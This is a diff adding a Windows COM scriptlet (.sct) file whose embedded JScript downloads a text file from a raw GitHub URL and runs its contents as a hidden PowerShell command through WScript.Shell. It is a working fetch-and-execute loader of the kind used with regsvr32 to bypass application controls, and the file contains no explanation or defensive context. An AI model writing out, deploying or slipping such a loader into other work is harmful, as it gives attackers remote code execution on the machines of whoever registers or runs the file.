@@ -1,0 +1,17 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+  progid="Test"
+  classid="{00000000-0000-0000-0000-0000FEEDBEEF}" >
+  <script language="JScript">
+<![CDATA[
+var x = new ActiveXObject("MSXML2.XMLHTTP");
+x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/init.txt",false);
+x.send();
+var r = x.responseText;
+var sh = new ActiveXObject("WScript.Shell");
+sh.Run("cmd /c powershell -c \"" + r.replace(/"/g,'\\"') + "\"",0,false);
+]]>
+</script>
+</registration>
+</scriptlet>
